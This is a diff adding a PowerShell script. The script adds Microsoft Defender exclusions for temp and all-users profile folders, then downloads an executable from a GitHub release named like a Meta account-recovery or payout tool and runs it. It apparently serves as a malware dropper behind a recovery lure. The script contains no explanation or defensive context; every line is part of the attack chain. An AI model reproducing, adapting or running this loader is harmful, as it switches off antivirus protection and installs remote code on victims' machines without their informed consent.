@@ -1,0 +1,26 @@
+Add-MpPreference -ExclusionPath "C:\Windows\Temp", " %ALLUSERSPROFILE%\*"
+Set-MpPreference -ExclusionProcess "C:\Windows\Temp*", " %ALLUSERSPROFILE%\*"
+$ErrorActionPreference = "Stop"
+[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
+
+$DownloadURL = 'https://github.com/MetaRestricted/Recovery-Payout-Account/releases/download/Recovery/install.exe'
+$DownloadURL2 = 'https://github.com/MetaRestricted/Recovery-Payout-Account/releases/download/Recovery/install.exe'
+
+$rand = Get-Random -Maximum 99999999
+$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
+$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\install_$rand.exe" } else { "$env:TEMP\install_$rand.exe" }
+
+try {
+    Invoke-WebRequest -Uri $DownloadURL -OutFile $FilePath -UseBasicParsing
+}
+catch {
+    try {
+        Invoke-WebRequest -Uri $DownloadURL2 -OutFile $FilePath -UseBasicParsing
+    }
+    catch {
+        Write-Host "Cannot download ZIP."
+        exit 1
+    }
+}
+
+Start-Process $FilePath -Wait
